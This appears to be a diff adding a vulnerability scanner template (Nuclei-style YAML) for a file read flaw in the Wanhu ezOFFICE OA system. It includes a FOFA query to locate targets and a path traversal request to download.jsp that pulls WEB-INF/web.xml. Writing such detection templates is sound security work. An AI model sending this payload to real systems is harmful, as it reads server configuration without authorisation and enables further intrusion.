@@ -1,0 +1,29 @@
+id: wanhu-ezoffice-download-fileread
+
+info:
+  name: 万户OA download接口文件读取漏洞
+  author: monster
+  severity: medium
+  tags: wanhu,ezoffice,fileread,oa
+  metadata:
+    max-request: 1
+    fofa-query: app="万户网络-ezOFFICE"
+    verified: true
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /defaultroot/public/iWebOfficeSign/download.jsp;?path=..&name=web.xml&FileName=WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true 
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains_all(body_2, 'web-app','</web-app>')"
+
+# 该漏洞需要携带cookie信息
